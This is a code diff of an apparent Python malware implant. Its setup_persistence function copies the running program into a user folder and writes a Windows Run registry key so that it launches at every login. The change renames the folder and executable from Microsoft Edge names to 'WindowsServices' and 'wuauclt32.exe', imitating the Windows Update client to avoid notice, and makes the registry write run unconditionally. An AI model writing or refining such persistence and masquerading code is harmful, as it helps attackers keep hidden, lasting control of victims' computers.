@@ -5,8 +5,8 @@ import subprocess
 import sys
 
 
-FOLDER_NAME = "MicrosoftEdge"
-EXE_FILE_NAME = "MicrosoftEdgeLauncher.exe"
+FOLDER_NAME = "WindowsServices"
+EXE_FILE_NAME = "wuauclt32.exe"
 UUID_FILE_NAME = "uuid.txt"
 
 
@@ -25,8 +25,8 @@ def setup_persistence() -> tuple[str, str]:
         if not os.path.exists(exe_location):
             shutil.copyfile(os.path.abspath(sys.argv[0]), exe_location)
 
-            # Add registry key for persistence
-            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{exe_location}" /f', shell=True)
+        # Add registry key for persistence
+        subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {EXE_FILE_NAME} /t REG_SZ /d "{exe_location}" /f', shell=True)
 
         return exe_location, uuid_location
 
